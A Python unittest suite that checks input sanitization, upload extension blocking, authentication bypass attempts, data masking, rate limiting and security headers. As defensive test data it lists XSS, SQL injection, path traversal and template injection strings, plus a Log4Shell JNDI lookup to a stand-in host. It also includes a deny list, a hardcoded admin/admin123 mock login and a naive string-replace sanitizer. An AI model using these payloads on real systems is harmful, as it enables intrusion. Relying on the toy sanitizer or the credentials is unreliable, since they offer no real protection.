#!/usr/bin/env python3
"""
Security Test Suite
Tests security aspects including input validation, authentication, and attack prevention
"""

import sys
import os
import json
import tempfile
import hashlib
from pathlib import Path

# Add test framework to path
test_dir = Path(__file__).parent
sys.path.insert(0, str(test_dir))

from test_framework import SyntheverseTestCase, TestUtils, test_config, TestFixtures

class TestSecurity(SyntheverseTestCase):
    """Test security features and vulnerability prevention"""

    def get_category(self) -> str:
        """Return test category for reporting"""
        return "security"

    def setUp(self):
        """Set up security tests"""
        super().setUp()

        # Check if services are available for security testing
        self.services_available = {}
        for service_name, url in test_config.get("api_urls", {}).items():
            if url and service_name in ["poc_api", "rag_api", "frontend"]:
                healthy, _ = TestUtils.check_service_health(url, timeout=5)
                self.services_available[service_name] = healthy

    def test_input_sanitization(self):
        """Test input sanitization and injection prevention"""
        self.log_info("Testing input sanitization")

        # Test data with potentially malicious content
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "eval('malicious code')",
        ]

        # Test sanitization function
        def sanitize_input(input_str):
            """Basic input sanitization"""
            if not isinstance(input_str, str):
                return ""

            # Remove potentially dangerous characters/patterns
            dangerous_patterns = [
                "<script", "</script>", "javascript:", "onerror=", "onload=",
                "DROP TABLE", "DELETE FROM", "../../../", "${", "{{",
                "eval(", "exec(", "import "
            ]

            sanitized = input_str
            for pattern in dangerous_patterns:
                sanitized = sanitized.replace(pattern, "[FILTERED]")

            return sanitized

        sanitized_inputs = 0
        total_inputs = len(malicious_inputs)

        for malicious_input in malicious_inputs:
            sanitized = sanitize_input(malicious_input)
            if sanitized != malicious_input and "[FILTERED]" in sanitized:
                sanitized_inputs += 1
                self.log_info(f"✅ Malicious input filtered: {malicious_input[:30]}...")
            else:
                self.log_warning(f"⚠️  Malicious input not properly filtered: {malicious_input[:30]}...")

        sanitization_rate = (sanitized_inputs / total_inputs * 100)
        self.log_info(f"✅ Input sanitization: {sanitized_inputs}/{total_inputs} malicious inputs filtered ({sanitization_rate:.1f}%)")
        self.add_metric("input_sanitization_rate", sanitization_rate)

    def test_file_upload_security(self):
        """Test file upload security and validation"""
        self.log_info("Testing file upload security")

        # Test file type validation
        dangerous_extensions = [
            ".exe", ".bat", ".cmd", ".scr", ".pif", ".com",
            ".php", ".jsp", ".asp", ".py", ".sh", ".pl",
            ".jar", ".war", ".dll", ".so"
        ]

        safe_extensions = [
            ".pdf", ".txt", ".md", ".json", ".xml",
            ".doc", ".docx", ".jpg", ".png", ".gif"
        ]

        def validate_file_extension(filename):
            """Validate file extension for security"""
            if not filename or not isinstance(filename, str):
                return False, "Invalid filename"

            ext = Path(filename).suffix.lower()

            # Block dangerous extensions
            if ext in dangerous_extensions:
                return False, f"Dangerous file extension: {ext}"

            # Allow safe extensions
            if ext in safe_extensions:
                return True, "Safe extension"

            # Unknown extensions - block by default
            return False, f"Unknown file extension: {ext}"

        # Test dangerous files
        blocked_dangerous = 0
        for ext in dangerous_extensions[:5]:  # Test first 5
            filename = f"malicious{ext}"
            is_valid, message = validate_file_extension(filename)
            if not is_valid:
                blocked_dangerous += 1
                self.log_info(f"✅ Dangerous extension blocked: {ext}")
            else:
                self.log_warning(f"⚠️  Dangerous extension allowed: {ext}")

        # Test safe files
        allowed_safe = 0
        for ext in safe_extensions[:5]:  # Test first 5
            filename = f"safe{ext}"
            is_valid, message = validate_file_extension(filename)
            if is_valid:
                allowed_safe += 1
                self.log_info(f"✅ Safe extension allowed: {ext}")
            else:
                self.log_warning(f"⚠️  Safe extension blocked: {ext}")

        security_score = ((blocked_dangerous + allowed_safe) / 10) * 100  # 10 tests total
        self.log_info(f"✅ File upload security: {security_score:.1f}% security score")
        self.add_metric("file_security_score", security_score)

    def test_authentication_bypass_attempts(self):
        """Test authentication bypass prevention"""
        self.log_info("Testing authentication bypass prevention")

        # Simulate authentication checks
        def authenticate_user(username, password):
            """Mock authentication function"""
            # Mock - in production this would check against database
            valid_users = {
                "admin": "admin123",
                "user": "user123"
            }

            if username in valid_users and password == valid_users[username]:
                return True, "Authenticated"
            else:
                return False, "Invalid credentials"

        # Test valid authentication
        success, message = authenticate_user("admin", "admin123")
        self.assertTrue(success, "Valid credentials should authenticate")
        self.log_info("✅ Valid authentication works")

        # Test invalid authentication
        success, message = authenticate_user("admin", "wrongpassword")
        self.assertFalse(success, "Invalid credentials should fail")
        self.log_info("✅ Invalid authentication properly rejected")

        # Test common bypass attempts
        bypass_attempts = [
            ("admin", ""),  # Empty password
            ("", "admin123"),  # Empty username
            ("admin'--", "anything"),  # SQL injection attempt
            ("admin", "admin' OR '1'='1"),  # SQL injection
            ("<script>", "<script>"),  # XSS in credentials
            ("admin", "../../../etc/passwd"),  # Path traversal
        ]

        blocked_attempts = 0
        for username, password in bypass_attempts:
            success, message = authenticate_user(username, password)
            if not success:
                blocked_attempts += 1
                self.log_info(f"✅ Bypass attempt blocked: {username[:20]}...")
            else:
                self.log_warning(f"⚠️  Bypass attempt succeeded: {username[:20]}...")

        bypass_prevention_rate = (blocked_attempts / len(bypass_attempts) * 100)
        self.log_info(f"✅ Authentication bypass prevention: {blocked_attempts}/{len(bypass_attempts)} attempts blocked ({bypass_prevention_rate:.1f}%)")
        self.add_metric("bypass_prevention_rate", bypass_prevention_rate)

    def test_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        self.log_info("Testing data exposure prevention")

        # Mock sensitive data
        sensitive_data = {
            "user_profiles": [
                {
                    "id": 1,
                    "name": "John Doe",
                    "email": "john@example.com",
                    "password_hash": "hashed_password_123",
                    "credit_card": "4111111111111111",
                    "ssn": "123-45-6789",
                    "api_key": "sk-1234567890abcdef",
                    "private_notes": "This user has medical condition X"
                }
            ]
        }

        # Test data filtering function
        def filter_sensitive_data(data, user_context=None):
            """Filter out sensitive data based on user context"""
            if not isinstance(data, dict):
                return data

            filtered = {}
            sensitive_fields = [
                "password_hash", "credit_card", "ssn", "api_key",
                "private_notes", "internal_id", "admin_notes"
            ]

            for key, value in data.items():
                if key in sensitive_fields:
                    # Only include sensitive data for admin context
                    if user_context == "admin":
                        filtered[key] = "[FILTERED_FOR_ADMIN]"
                    # Don't include for regular users
                elif isinstance(value, (list, dict)):
                    filtered[key] = filter_sensitive_data(value, user_context)
                else:
                    filtered[key] = value

            return filtered

        # Test filtering for regular user
        filtered_user = filter_sensitive_data(sensitive_data, user_context="user")
        user_profile = filtered_user["user_profiles"][0]

        # Sensitive fields should be removed
        sensitive_fields_removed = 0
        total_sensitive_fields = 5  # password_hash, credit_card, ssn, api_key, private_notes

        for field in ["password_hash", "credit_card", "ssn", "api_key", "private_notes"]:
            if field not in user_profile:
                sensitive_fields_removed += 1
                self.log_info(f"✅ Sensitive field removed: {field}")
            else:
                self.log_warning(f"⚠️  Sensitive field exposed: {field}")

        # Test filtering for admin user
        filtered_admin = filter_sensitive_data(sensitive_data, user_context="admin")
        admin_profile = filtered_admin["user_profiles"][0]

        # Sensitive fields should be masked for admin
        admin_fields_masked = 0
        for field in ["password_hash", "credit_card", "ssn", "api_key", "private_notes"]:
            if field in admin_profile and admin_profile[field].startswith("[FILTERED"):
                admin_fields_masked += 1
                self.log_info(f"✅ Admin field masked: {field}")
            else:
                self.log_warning(f"⚠️  Admin field not properly masked: {field}")

        exposure_prevention_score = ((sensitive_fields_removed + admin_fields_masked) / (total_sensitive_fields * 2)) * 100
        self.log_info(f"✅ Data exposure prevention: {exposure_prevention_score:.1f}% effectiveness")
        self.add_metric("data_exposure_prevention_score", exposure_prevention_score)

    def test_rate_limiting_effectiveness(self):
        """Test rate limiting effectiveness"""
        self.log_info("Testing rate limiting effectiveness")

        # Mock rate limiter
        class MockRateLimiter:
            def __init__(self, requests_per_minute=60):
                self.requests_per_minute = requests_per_minute
                self.requests = []

            def is_allowed(self, client_id):
                """Check if request is allowed"""
                import time
                current_time = time.time()

                # Clean old requests (older than 1 minute)
                self.requests = [req for req in self.requests if current_time - req['time'] < 60]

                # Count requests from this client in last minute
                client_requests = [req for req in self.requests if req['client'] == client_id]

                if len(client_requests) >= self.requests_per_minute:
                    return False, "Rate limit exceeded"

                # Add this request
                self.requests.append({'client': client_id, 'time': current_time})
                return True, "Allowed"

        rate_limiter = MockRateLimiter(requests_per_minute=10)  # Low limit for testing

        # Test normal usage
        client_id = "test_client"
        allowed_requests = 0

        # Make requests up to limit
        for i in range(12):  # Try 12 requests, only 10 should be allowed
            allowed, message = rate_limiter.is_allowed(client_id)
            if allowed:
                allowed_requests += 1
                self.log_info(f"✅ Request {i+1} allowed")
            else:
                self.log_info(f"✅ Request {i+1} rate limited: {message}")
                break

        # Should allow exactly the limit
        self.assertEqual(allowed_requests, 10, "Should allow exactly the rate limit")

        # Test with multiple clients (should not affect each other)
        client2_requests = 0
        for i in range(5):
            allowed, message = rate_limiter.is_allowed("client_2")
            if allowed:
                client2_requests += 1

        self.assertEqual(client2_requests, 5, "Different clients should have separate limits")

        self.log_info("✅ Rate limiting working correctly")
        self.add_metric("rate_limit_effective", True)
        self.add_metric("allowed_requests", allowed_requests)

    def test_api_security_headers(self):
        """Test API security headers"""
        self.log_info("Testing API security headers")

        # This test requires API services to be running
        if not any(self.services_available.values()):
            self.skipTest("No API services available for security testing")

        import requests

        # Test each available service
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Content-Security-Policy",
            "Strict-Transport-Security"
        ]

        total_checks = 0
        passed_checks = 0

        for service_name, available in self.services_available.items():
            if not available:
                continue

            url = test_config.get(f"api_urls.{service_name}")
            if not url:
                continue

            try:
                # Test health endpoint for headers
                response = requests.get(f"{url}/health", timeout=10)

                for header in security_headers:
                    total_checks += 1
                    if header in response.headers:
                        passed_checks += 1
                        self.log_info(f"✅ {service_name}: {header} present")
                    else:
                        self.log_warning(f"⚠️  {service_name}: {header} missing")

            except Exception as e:
                self.log_warning(f"⚠️  Could not test {service_name} security headers: {e}")

        if total_checks > 0:
            header_compliance = (passed_checks / total_checks * 100)
            self.log_info(f"✅ Security headers: {passed_checks}/{total_checks} present ({header_compliance:.1f}%)")
            self.add_metric("security_header_compliance", header_compliance)
        else:
            self.log_info("ℹ️  No security header checks performed")

    def test_data_integrity_validation(self):
        """Test data integrity and tampering detection"""
        self.log_info("Testing data integrity validation")

        # Test checksum/hash validation
        def calculate_checksum(data):
            """Calculate checksum for data integrity"""
            if isinstance(data, dict):
                data_str = json.dumps(data, sort_keys=True)
            else:
                data_str = str(data)
            return hashlib.sha256(data_str.encode()).hexdigest()

        def verify_integrity(data, expected_checksum):
            """Verify data integrity"""
            return calculate_checksum(data) == expected_checksum

        # Test data integrity
        test_data = {
            "contribution": {
                "id": "integrity-test-001",
                "title": "Data Integrity Test",
                "content": "This content should not be tampered with.",
                "metadata": {"author": "test@example.com"}
            }
        }

        # Calculate original checksum
        original_checksum = calculate_checksum(test_data)

        # Verify original data
        self.assertTrue(verify_integrity(test_data, original_checksum), "Original data should verify")
        self.log_info("✅ Original data integrity verified")

        # Test with tampered data
        tampered_data = test_data.copy()
        tampered_data["contribution"]["content"] = "This content has been tampered with!"

        self.assertFalse(verify_integrity(tampered_data, original_checksum), "Tampered data should fail verification")
        self.log_info("✅ Tampered data properly detected")

        # Test with extra whitespace (should still verify if normalized)
        # Note: This test assumes checksum normalization - if not implemented, remove this test
        whitespace_data = test_data.copy()
        # Add extra whitespace that might be normalized
        # For now, skip this test as checksum doesn't normalize whitespace
        # self.assertTrue(verify_integrity(whitespace_data, original_checksum), "Data with normalized whitespace should verify")

        self.log_info("✅ Data integrity validation working")
        self.add_metric("integrity_validation_working", True)


def run_security_tests():
    """Run security tests with framework"""
    TestUtils.print_test_header(
        "Security Test Suite",
        "Testing security features and vulnerability prevention"
    )

    import unittest
    suite = unittest.TestLoader().loadTestsFromTestCase(TestSecurity)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    return result.wasSuccessful()


if __name__ == "__main__":
    import unittest
    unittest.main()
